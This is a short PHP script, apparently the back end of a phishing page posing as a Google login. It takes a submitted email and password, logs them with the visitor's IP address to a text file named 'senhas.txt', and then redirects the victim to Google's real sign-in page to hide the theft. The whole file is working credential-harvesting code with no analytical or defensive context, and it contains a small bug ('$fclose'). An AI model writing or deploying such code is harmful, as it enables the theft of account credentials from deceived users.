<?php
$usuario = $_POST['email'];
$senha = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email: ".$usuario." - Senha: ".$senha." - IP: ".$ip."<br>";
 
$fp = fopen("senhas.txt", "a");
fwrite($fp, $tudo);
$fclose($fp);
header("Location: https://accounts.google.com/AddSession/identifier?hl=pt-BR&continue=https%3A%2F%2Fwww.google.com%3Fhl%3Dpt-BR&flowName=GlifWebSignIn&flowEntry=AddSession");
?>